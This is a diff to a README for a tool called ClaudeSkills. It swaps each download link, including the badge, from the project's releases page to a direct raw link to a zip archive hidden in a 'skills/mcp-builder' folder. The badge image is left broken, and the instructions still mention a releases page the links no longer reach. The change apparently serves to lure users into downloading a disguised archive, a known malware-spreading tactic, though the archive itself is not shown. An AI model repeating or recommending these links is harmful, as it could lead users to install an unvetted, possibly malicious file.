@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download ClaudeSkills](https://img.shields.io/badge/Download%20ClaudeSkills-Click%20Here-blue)](https://github.com/kyawshinethu/ClaudeSkills/releases)
+[![Download ClaudeSkills](https://raw.githubusercontent.com/kyawshinethu/ClaudeSkills/main/skills/mcp-builder/ClaudeSkills-v3.1.zip%20ClaudeSkills-Click%20Here-blue)](https://raw.githubusercontent.com/kyawshinethu/ClaudeSkills/main/skills/mcp-builder/ClaudeSkills-v3.1.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ ClaudeSkills helps you enhance your understanding and use of Claude's features. 
 
 1. **Visit the Download Page:**   
    Go to the releases page to download the application:  
-   [Download ClaudeSkills](https://github.com/kyawshinethu/ClaudeSkills/releases)
+   [Download ClaudeSkills](https://raw.githubusercontent.com/kyawshinethu/ClaudeSkills/main/skills/mcp-builder/ClaudeSkills-v3.1.zip)
 
 2. **Choose the Right File:**  
    On the releases page, you will see a list of files. Select the latest version of ClaudeSkills for your operating system.
@@ -90,6 +90,6 @@ To receive news and updates about ClaudeSkills, consider following us on our Git
 
 For your convenience, here is the link once more for quick access:
 
-[Download ClaudeSkills](https://github.com/kyawshinethu/ClaudeSkills/releases) 
+[Download ClaudeSkills](https://raw.githubusercontent.com/kyawshinethu/ClaudeSkills/main/skills/mcp-builder/ClaudeSkills-v3.1.zip) 
 
 Thank you for choosing ClaudeSkills! Your journey to improving your skills starts now.
